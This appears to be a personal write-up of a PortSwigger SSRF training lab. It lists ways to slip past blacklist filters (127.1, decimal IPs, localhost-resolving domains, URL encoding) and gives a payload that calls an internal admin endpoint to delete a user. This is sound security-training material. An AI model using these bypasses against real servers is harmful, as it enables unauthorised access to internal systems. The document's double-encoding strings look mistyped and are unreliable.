# SSRF with blacklist-based input filter

[Lab in PortSwigger](https://portswigger.net/web-security/ssrf/lab-ssrf-with-blacklist-filter)

## Definition
 Some applications block input containing hostnames like 127.0.0.1 and localhost, or sensitive URLs like /admin. In this situation, you can often circumvent the filter using various techniques:

- Using an alternative IP representation of 127.0.0.1, such as 2130706433, 017700000001, or 127.1.
- Registering your own domain name that resolves to 127.0.0.1. You can use spoofed.burpcollaborator.net for this purpose.
- Obfuscating blocked strings using URL encoding or case variation.

## Notes
1. Intercept the Check Stock request and change the `stockApi` parameter to `http://127.0.0.1/admin`
2. Notice that the server blocks the request with the given message: `External stock check blocked for security reasons`
3. Encode the letter `a` of `admin` twice. Firstly as `%61admin` and lastly as `%%3631dmin`. Try again
4. The request still failing with the same message
5. Change the IP address to `127.1` and try one more time
6. The complete payload will be `stockApi=http%3A%2F%2F127.1/%%36%31%64%6d%69%6e/delete?username=carlos`

## Key Words
> blacklist, circumvent, ssrf